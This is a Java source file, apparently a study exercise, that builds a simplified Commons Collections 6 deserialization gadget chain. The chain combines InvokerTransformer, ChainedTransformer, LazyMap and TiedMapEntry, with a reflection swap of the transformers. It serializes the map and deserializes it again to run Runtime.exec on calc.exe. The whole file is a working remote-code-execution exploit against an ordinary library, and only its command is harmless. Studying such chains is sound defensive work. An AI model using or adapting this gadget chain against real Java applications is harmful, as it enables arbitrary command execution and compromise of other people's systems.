package CC6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

//简易最终版
public class EazyCC6 {

    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException {

        Transformer[] fakeTransformers = new Transformer[]{
                new ConstantTransformer(1)
        };

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),

                new InvokerTransformer("getMethod",
                        new Class[] { String.class, Class[].class },
                        new Object[] { "getRuntime", new Class[0] }),

                new InvokerTransformer("invoke",
                        new Class[] { Object.class, Object[].class },
                        new Object[] { null, new Object[0] }),

                new InvokerTransformer("exec",
                        new Class[] { String.class },
                        new String[] { "calc.exe" }),

                new ConstantTransformer(1),
        };

        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry entry = new TiedMapEntry(outerMap, "oo");

        // 不使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap
        HashMap expMap = new HashMap();
        expMap.put(entry, "uu");
        outerMap.remove("oo");

            Field f ;
            f = ChainedTransformer.class.getDeclaredField("iTransformers");
            f.setAccessible(true);
            f.set(transformerChain, transformers);

            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(barr);
            oos.writeObject(expMap);
            oos.close();

            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
            ois.readObject();
    }
}
